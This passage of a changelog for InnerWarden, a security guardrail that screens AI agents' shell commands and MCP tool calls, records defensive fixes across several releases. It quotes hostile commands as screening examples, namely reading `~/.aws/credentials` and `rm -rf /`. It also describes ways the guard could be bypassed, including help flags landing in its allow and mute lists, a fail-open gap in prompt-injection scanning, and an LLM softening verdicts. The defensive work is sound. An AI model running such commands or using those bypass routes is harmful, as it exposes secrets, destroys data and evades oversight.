  `getUpdates` and reports the id it found. A bot nobody has messaged yet has no
  chat to reply to, which is the normal state seconds after @BotFather hands over
  a token, so that case is explained and retried rather than reported as a
  failure. A rejected token says it was rejected. Typing the id by hand stays
  available throughout: an automatic step that can fail must not become the only
  way through.

## 1.4.1 - 2026-08-24

Three places the product asserted one thing and behaved otherwise. None let an
attack through; all three cost a new user time or trust, which is worse for a
security tool than a missing feature.

### Fixed

- `innerwarden notify --slack-webhook <url> --test` tested the wrong channel. It
  planned the test against the configuration from BEFORE the write, so on a
  fresh config it sent nothing and said nothing, and on a host that already had
  a channel it tested the OLD one and printed a success line for a channel it
  had never contacted. Setting a channel and testing it in one command is the
  obvious thing to do, `--help` suggests it, and the setup wizard does it.

  The test covering this was named `..._fires_the_just_set_channel` and asserted
  that the channel already in the file fired, not the one just set. The name
  promised the fix and the assertion pinned the bug.

- `innerwarden status` always reported the local dashboard as not running. Two
  constants were both called `DEFAULT_BIND`, in different modules, with
  different ports, and the status probe used the `serve` one to look for a
  dashboard that binds the other. The first command written for beginners was
  wrong about the second thing it says.

- `innerwarden uninstall` left every non-Claude agent calling a binary that no
  longer existed. It removed the Claude Code hook only, while Cursor, Codex and
  Gemini are wired by writing this binary's absolute path into their MCP config,
  and then it deleted the binary. `innerwarden agents disconnect`, the command
  that would have fixed it, went with it. Uninstall now unwires every agent
  first, through the same entry point `agents disconnect --all` uses.

- The npm launcher told supported platforms they were unsupported. After an
  uninstall (or an install with `--ignore-scripts`) the launcher survives
  without its binary and reported "no prebuilt binary for linux-x64" one line
  before listing linux and x64 as supported. It now distinguishes a missing
  binary on a published platform from a platform that has no build, and names
  the reinstall.

## 1.4.0 - 2026-08-23

The first ten minutes. A new user could install this, follow what it printed,
and end up unprotected without an error anywhere.

A minor rather than a patch because `upgrade` gained exit codes and the bare
`innerwarden` command prints something different on a machine with no config.

### Fixed

- `cat ~/.aws/credentials` was a review, not a deny, while `cat deploy.pem` was
  a deny. The hard list was keyed on file EXTENSION rather than on what the file
  holds, and a `.pem` is frequently a public certificate. The credential file is
  now scored as one; `~/.aws/config` beside it stays a review, because region
  and output settings are read legitimately and denying them was never the
  intent.

- `innerwarden allow --help` wrote the literal string `--help` into the
  guardrail's own bypass list and printed success. `check "--help"` then returned
  ALLOW with `[suppressed: allow --help]`. `mute --help` was worse: it lands in
  mute categories, and a muted category suppresses every rule in it against every
  command. `setup --help` ran the wizard.

  Help is now answered before dispatch for all 24 subcommands. `check` keeps
  screening: its argument IS the command being examined, so `--help` counts as
  help only when it is the sole non-output-flag argument, and
  `check rm -rf / --help` still denies.

- `agents connect` said nothing about restarting. The hook is read only at agent
  startup, so a user returned to a running session believing it was screened when
  it was not. Every sibling path already said it. Silent false protection is
  worse than an error.

- `status` was dispatched and appeared nowhere in `--help`, and it hardcoded the
  guard mode as unknown while the data it needed was already in hand. The result
  was that there was NO configuration in which `status` reported everything as
  fine: the command written for beginners could never tell one they were done.
  It now appears in help, reads the mode, probes the dashboard, and distinguishes
  "nothing recorded yet" from "the record could not be read".

- A fresh install reported itself broken. A directory that did not exist yet was
  treated as unwritable, so `innerwarden graph` on a new machine printed
  "InnerWarden has not recorded for 0 seconds (actions lost,
  graph_directory_unwritable)" and the dashboard served the same. A fresh box is
  not a broken one.

- `upgrade --check` fetched a checksum, discarded it, and told you to upgrade
  whatever the answer was, including when already current. It now reads the
  published manifest and says which it is.

- `upgrade` silently fought npm. A binary under a user-owned npm prefix upgraded
  with no warning and the next `npm install -g` reverted it, with no message from
  either tool. The site itself recommends that prefix. It now refuses unless
  forced.

- `uninstall` removed the Claude hook and left every other agent's MCP wiring
  pointing at a deleted binary.

### Changed

- A bare `innerwarden` on a machine with no configuration prints six lines saying
  nothing is wired yet, with the two commands to run, instead of 24 subcommands
  with `setup` on line one. `innerwarden --help` is unchanged.

- `upgrade` exits 2 when it refuses an npm-managed copy, and `upgrade --check`
  exits 1 when it cannot determine the published version.

### Internal

- `ureq` 2 to 3. The migration mattered rather than the version: ureq 3 moved
  timeouts off the request builder onto the agent, so the obvious port silently
  leaves every network probe unbounded, and its error enum went from two
  variants to ten, so an exhaustive match keeps compiling while losing cases.
  Both are now asked as questions (`is_an_answer`, `status_of`) in one place.

- CI now refuses an em dash on any line a change adds. The paid repo's version of
  that gate had been green since it was written without ever running: a shallow
  checkout has no `origin/master`, and its missing-base branch exited 0. This one
  fetches the base and refuses if it cannot.

- Coverage is measured with a floor derived from a measurement rather than
  chosen, browser journeys run instead of being counted, and the updater and
  release verifier are exercised rather than having their own source read back.

## 1.3.7 - 2026-08-21

Posture reporting. The dashboard could describe a control as working when
nothing had confirmed it, and a fresh install could read as a fault.

### Fixed

- The headline no longer counts an unconfirmed control as working (#108).
- A layer's sentence can no longer contradict the badge above it (#107); the
  pill, the row and the gap list now tell one story (#106).
- The API validator stopped discarding the layer disposition (#105).

### Added

- Posture says what needs an operator and what is simply fine, so a fresh
  install is not reported as a problem (#104).

## 1.3.6 - 2026-08-20

### Fixed

- `uninstall --dry-run` uninstalled instead of previewing (#101).
- The agent view shows which mode the guard is in, and `--help` documents
  dry-run (#100).

## 1.3.5 - 2026-08-20

### Fixed

- `status` no longer blames a config file that was never read (#97).
- `upgrade` names the command that actually upgrades this install, which
  differs by install channel (#96).

### Changed

- One tag now moves every install channel, instead of each being cut by hand
  (#95).

## 1.3.4 - 2026-08-20

### Fixed

- A fresh install is no longer reported as a broken one (#93).
- Absence of a signature is not absence of an agent (#89).
- An empty substitution no longer hides the command behind it (#86).
- The guard stopped reading data as if it were a command, and now names the
  safe way out (#85).

### Added

- One command that says whether this install is actually protecting you (#90).

### Changed

- CI: a mutation sweep that finishes and that fails when it should (#87); the
  apt lock no longer makes every Linux run a coin flip (#91); a retry loop no
  longer outlives the step it runs inside (#92).

## 1.3.3 - 2026-08-16

Two screening fixes, both found by running the shipped build against real
work rather than against the test corpus. Each was verified by reverting the
fix and watching the new test fail.

### Fixed

- **The tamper rule no longer crosses command boundaries.**
  `check_security_tamper` tested the removal verb and the InnerWarden path
  against the whole command string independently, so the two never had to be
  related to each other. Any ordinary cleanup step that shared a line with a
  read of our own config was denied at score 60 — a rename of an unrelated
  file beside a `grep` of `agent.toml`, a `sqlite3` query beside a removal
  under a temp directory. In none of them does the removal verb name an
  InnerWarden path, yet all were reported as *"disabling or tampering with
  security monitoring"*.

  That is the worst direction for a false positive to point. It lands on the
  person doing support, during an incident, and it teaches them that the
  tamper verdict is noise — the one verdict that has to keep its credibility.

  `destructive_rm_root` already refused to cross command boundaries for
  exactly this reason, and the tamper rule now uses the same segmentation:
  the verb and the path must belong to one command. Genuine self-tamper
  (removing or moving our own binary, config or state) still denies, whatever
  else shares the line.

- **Credential hunting is flagged, not just credential reading.** A command
  that goes looking for secrets across a broad root now scores, where
  previously only a read of an already-known secret path did.

## 1.3.2 - 2026-08-13

No behaviour change for users. This release carries build-supply-chain and
test-corpus hygiene, plus the CI repairs that make the nightly deep checks
mean something again.

### Security

- **postcss forced past GHSA-fxqj-rqcc-2cmp.** A version at or below 8.5.22
  reads arbitrary `.map` files from an attacker-controlled `sourceMappingURL`
  when `from` is unset. It is a development dependency of the dashboard build
  and never reaches the shipped binary, so this is hygiene rather than an
  exposure, but the lock now resolves to 8.5.26 through an `overrides` entry.
  The built bundle is byte-identical.
- **The Google API key fixture in the ATR corpus is now unmistakably a
  fixture.** It lived in the `true_positives` block of the rule that detects
  leaked API keys, next to other synthetic examples, and had an open GitHub
  secret-scanning alert against it since 2026-07-23. It still matches the
  rule's own pattern, so the rule keeps being tested.

### Fixed

- **The nightly undefined-behaviour check finishes again.** The `miri` job had
  no time budget, so it ran to GitHub's six-hour platform cap and was killed
  every night from 2026-08-06 to 2026-08-12, reporting "cancelled" — which
  reads as harmless. Nothing was checked for UB for a week and nothing said so.
  Three tests build 20k-node graphs to prove a byte budget, which an
  interpreter cannot do cheaply; they are skipped under miri, and a check now
  fails when a cap-scale test is added without that skip. miri also carries an
  explicit timeout, so a future hang fails visibly. Running it for real found
  no undefined behaviour.
- **The nightly mutation run reports again.** `cargo-mutants` hit its own job
  timeout, which killed the report upload with it, so every night produced
  nothing. It now stops itself inside the job budget and ships a partial report
  that says it is partial.

## 1.1.0 - 2026-08-06

### Security

- **The updater no longer runs a script it downloads.** `innerwarden upgrade`
  fetched an installer over the network and piped it to a shell, so an upgrade
  trusted whatever that endpoint served that day and no signature was ever
  checked. It now downloads the release asset for the running platform, verifies
  its SHA-256 and its Ed25519 signature against a public key compiled into the
  binary doing the upgrading, and swaps it in with an atomic rename beside the
  target. Either check failing means nothing is written.
- **Packaging verifies the bytes before it packages them.** The npm and
  `.deb`/`.rpm` build paths downloaded the release binaries and wrapped them
  unchecked, so a compromised release host reached users through three channels
  at once. Both paths now verify SHA-256 and Ed25519 for all six targets before
  the bytes enter a package, and treat a missing sidecar as an error rather than
  a skipped check.
- **A local model can no longer soften a rules verdict.** The optional LLM second
  opinion could downgrade a rules `deny` to `allow`. The effective verdict is now
  the stricter of the two, the command under review is delimited as untrusted
  input in the prompt, and the response records which layer decided.
- **Publishing is gated on green CI for the exact commit.** A tag on a commit
  whose tests were failing used to publish anyway, with npm provenance attesting
  it.

### Added

- **Guards the agent you actually run, not just Claude Code.** `install` used to
  refuse every other agent with "only 'claude-code' is supported today", which on
  a host running anything else read as "InnerWarden cannot protect this". Every
  known agent now resolves to a mechanism and a command that works: a PreToolUse
  hook where one exists, automatic MCP wiring through `innerwarden agents
  connect <agent>` where it does not, and `innerwarden contain` for agents with
  no cooperative surface at all. Claude Code, Cursor, Codex, Gemini CLI and
  OpenClaw wire automatically; wiring is reversible with `agents disconnect`.
- **OpenClaw support.** Its MCP servers live under a nested `mcp.servers` table
  that the config editor could not find, so an OpenClaw install looked unguardable.
  Sibling keys and unrelated settings are preserved, and a config that is not
  strict JSON is refused rather than rewritten.
- **Per-session behaviour in the command hook.** Call rate and repeated access to
  sensitive paths are now tracked across the one-shot hook invocations that make
  up a session, so a pattern that only exists across commands is visible to the
  verdict.
- **`innerwarden host <command>`.** Four verbs exist in both this guardrail and
  the paid Active Defence host layer. They run here, say so when the host layer
  also has one, and `host` reaches that version explicitly instead of it being
  silently shadowed.
- **A recording-health surface.** `innerwarden graph` and
  `/api/guard/record-health` report when the local record has stopped recording
  and for how long, rather than a dashboard quietly showing older and older data.

### Fixed

- **Recording stopped once the graph passed 16 MiB, and said so only on stderr.**
  The store was verified against the size limit meant for agent configuration
  files, and the verification read runs before the prune that would have brought
  it back under, so an install that crossed the limit never recorded again. The
  store now has its own ceiling, prune enforces a byte budget and not just a node
  count, and command ids no longer collide after a prune (which silently
  overwrote surviving history). The outage is now reported where a human looks.
- **A quoted heredoc body is text, not code.** Writing a document that quoted a
  dangerous command, in a pull request body or an incident postmortem, was blocked
  as though the command were being run. Unquoted delimiters, real substitutions,
  and pipes into an interpreter are still read as code.
- **The dashboard tells the truth about what it knows.** It no longer reports a
  setup state it never determined, no longer tells a paid host it recorded
  nothing, distinguishes "unavailable" from "empty" and says which failure it
  was, and serves the agent and token-intelligence views in both editions.
- **Suppression changes are recorded.** `allow` and `mute` changed what the guard
  blocks and left no trace.
- **The hook stopped compiling rules that cannot match.** The ATR corpus was
  compiled in full on every tool call, including the 62 pattern-tier rules that
  declare a surface the shell path never presents. Filtering before compilation
  took the hook from 208 ms to 73 ms.

## 1.0.7 - 2026-07-29

### Fixed

- **MCP response inspection no longer fails open.** The proxy scanned only
  `content[].type=="text"` blocks of a `tools/call` result, so a result carrying
  its payload anywhere else produced an empty string and passed as clean —
  silently bypassing indirect-prompt-injection detection. `structuredContent`
  (structured tool output, part of the current protocol revision) took exactly
  that path. The scan now covers text blocks, `structuredContent`, and any
  unrecognised non-empty result shape, bounded to 64 KiB and truncated on a char
  boundary. Deliberately shape-agnostic, so a new result field cannot reopen the
  same blind spot.

### Added

- **Guard events sink for a co-located host agent.** On a blocked or
  would-block decision (command or MCP tool call), the guard appends one compact
  JSON line to `guard-events.jsonl` next to the graph, so an InnerWarden host
  agent running on the same machine can ingest the guard's findings. Block-only,
  best-effort, and already redacted — a passing command adds no extra I/O, and a
  failure here can never alter a verdict or the hook exit code.

## 1.0.0 - 2026-07-23

First public InnerWarden release: the free, cross-OS guardrail for AI agents. Runs
on Linux, macOS, and Windows.

### Added

- Command screening: analyzes an AI agent's shell command before it runs and
  returns a verdict (allow, review, or deny).
- Tool-call screening: inspects MCP and tool calls and returns the same verdict.
- MCP proxy: a man-in-the-middle in front of an MCP server that inspects every
  JSON-RPC message and can refuse a disallowed tool call inline, keeping stdout
  pure MCP traffic.
- AI Jail: run an agent in a constrained profile so a screened-and-denied action
  is stopped rather than only flagged.
- Agent discovery: finds AI agents and agent tooling on the machine.
- Local dashboard: a read-only view on loopback at `http://127.0.0.1:8787` that
  never leaves the machine.
- Notifications: surfaces verdicts and events through configured channels.
- Claude Code integration via a PreToolUse hook, plus MCP-client support for
  Cursor, Codex, and other MCP clients.
